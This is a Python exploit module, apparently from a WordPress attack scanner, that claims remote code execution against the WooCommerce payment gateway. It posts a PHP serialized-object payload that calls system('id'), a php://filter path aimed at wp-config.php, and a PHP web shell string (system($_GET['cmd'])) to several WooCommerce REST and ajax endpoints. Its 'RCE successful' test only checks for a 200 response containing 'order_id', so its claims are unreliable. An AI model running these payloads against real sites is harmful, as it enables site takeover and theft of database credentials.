import requests
from core.printmodels import *
import json

class WooCommerce_Payment_RCE:
    def __init__(self):
        self.name = "WooCommerce Payment Gateway RCE"
        self.description = "WooCommerce Payment Gateway Object Injection to RCE (2024)"
        self.author = "mrphoenix"

    def Exploit(self, site):
        try:
            headers = {
                'User-Agent': 'Mozilla/5.0',
                'Content-Type': 'application/json',
                'X-WC-Webhook-Topic': 'order.created'
            }

            # Multiple attack vectors
            payloads = [
                {
                    "payment_method": "O:8:\"stdClass\":2:{s:4:\"type\";s:4:\"eval\";s:4:\"code\";s:31:\"system('id');\";}",
                    "payment_method_title": "DrDataYE",
                    "set_paid": True
                },
                {
                    "webhook": {
                        "delivery_url": "php://filter/convert.base64-decode/resource=../../../wp-config.php",
                        "secret": "<?php system($_GET['cmd']); ?>"
                    }
                }
            ]

            endpoints = [
                f"{site}/wp-json/wc/v3/orders",
                f"{site}/wp-json/wc/v3/webhooks",
                f"{site}/wp-admin/admin-ajax.php?action=woocommerce_ajax_order_processing"
            ]

            for endpoint in endpoints:
                for payload in payloads:
                    response = requests.post(endpoint, headers=headers, json=payload, verify=False, timeout=10)
                    if response.status_code in [200, 201] and ('order_id' in response.text or 'webhook_id' in response.text):
                        return PrintSuccess(f"[WooCommerce-2024] Vulnerable! RCE successful at {endpoint}")

            return PrintFailed("[WooCommerce-2024] Not Vulnerable")
        except Exception as e:
            return PrintError(f"[WooCommerce-2024] Error: {str(e)}")
